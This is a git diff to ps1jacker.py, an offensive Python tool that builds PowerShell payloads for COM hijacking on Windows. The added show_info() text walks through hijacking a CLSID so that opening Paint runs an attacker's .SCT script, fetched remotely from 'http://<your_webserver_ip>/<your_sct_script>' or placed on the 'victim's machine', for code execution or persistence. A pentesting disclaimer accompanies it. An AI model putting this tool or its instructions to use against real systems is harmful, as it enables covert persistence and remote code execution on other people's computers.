@@ -23,6 +23,8 @@ Twitter: @davidkasabji
 Date Created: 11.08.2018
 
 Ps1jacker is a tool that generates a PowerShell payload for COM Hijacking.
+DISCLAIMER: Please do not abuse this tool for illegal activities.
+
 For more information type ps1jacker.py -h
     """)
 
@@ -146,17 +148,42 @@ function Execute-COM-Hijack {
     fps.close()
     print("Payload generated! ")
 
+def show_info():
+    print("""WHAT IS COM HIJACKING?
+COM Hijacking is a method for an attacker to gain remote code execution or persistence on victims machine, by using legitimate Windows process'. 
+The advantage of Ps1jacker is that it uses a method which allows the user to specify his/her script path on Web Server, which means there is no local
+storage on victims machine involved in this process. 
+
+DEFAULT METHOD [-hd]
+The Default method will generate the payload for you without any of your user input. However, there are 2 precautions:
+1. It will only work if you grab the file calc.SCT from examples directory and copy it to your victims machine exactly at C:\\tools\\COM Testing\\,
+as the payload will be generated in a way, where it will expect the .SCT script to be located in that path.
+2. This works only with using MSPAINT.exe (Paint). Meaning, victim has to open PAINT.exe in order for the payload to trigger.
+
+Once you have done that, you can execute the powershell script on victims machine and it should generate all the registry entries for you.
+
+CUSTOM METHOD [-p][-ch][-cf]
+With the custom method you may specify your own .SCT script and decide whether:
+1. Host it on your webserver: in this case you have to specify the path to the file on your server, eg. 'http://<your_webserver_ip>/<your_sct_script>'
+2. Host it on your victim's machine: in this case you specify the path where your .SCT script is residing on your victim's machine.
+You also have to specify your own CLSID which you will hijack.
+Same goes for the unique Fake CLSID. And remember, it has to be really unique, otherwise you will trigger an existing process in Windows instead of your
+script.
+
+DISCLAIMER: 
+Please do not use this tool for illegal activities. This tools should be used by pentesters to ease the generation of payload for COM Hijacking technique.""")
+
+
 def main():
     gen_header()
     parser = argparse.ArgumentParser()
 
     try:
-        #parser.add_argument("-h", "--help", help="Help 101.")
-        parser.add_argument("-ho", "--hijack-option", type=str, dest="hijack_option", help="File or HTTPS source.")
         parser.add_argument("-hd", "--hijack-default", dest="hijackdefault", help="Currently supported default option is MSPAINT.", action="store_true")
         parser.add_argument("-p", "--path", type=str, dest="hijackfilepath", help="Path to where the .SCT file is located on victim machine OR the HTTP destination where the file exists.")
-        parser.add_argument("-ch", "--clsid-hijack", type=str, dest="clsidabuse", help="CLSID to Hijack. Be sure to provide valid CLSID, check --help for more information.")
+        parser.add_argument("-ch", "--clsid-hijack", type=str, dest="clsidabuse", help="CLSID to Hijack. Be sure to provide valid CLSID.")
         parser.add_argument("-cf", "--clsid-fake", type=str, dest="clsidfake", help="The Fake unique CLSID you can provide.")
+        parser.add_argument("-i", "--info", dest="info", help="Provides more information on the Tool.", action="store_true")
         arguments = parser.parse_args()
 
     except SystemExit:
@@ -166,6 +193,9 @@ def main():
         parser.print_help()
         sys.exit(1)
 
+    if arguments.info:
+             show_info()
+
     if arguments.hijackdefault:
         gen_default()
     else:
@@ -173,7 +203,7 @@ def main():
             gen_custom(arguments.clsidabuse, arguments.clsidfake, arguments.hijackfilepath)
         else:
             print("Some of the necessary arguments were not defined: hijack-file-path, clsid-abuse, clsid-fake. Exiting..")
-            sys.exit(1)       
+            sys.exit(1)  
 
     """if arguments.hijack_option:
         hijackOption = arguments.hijack_option
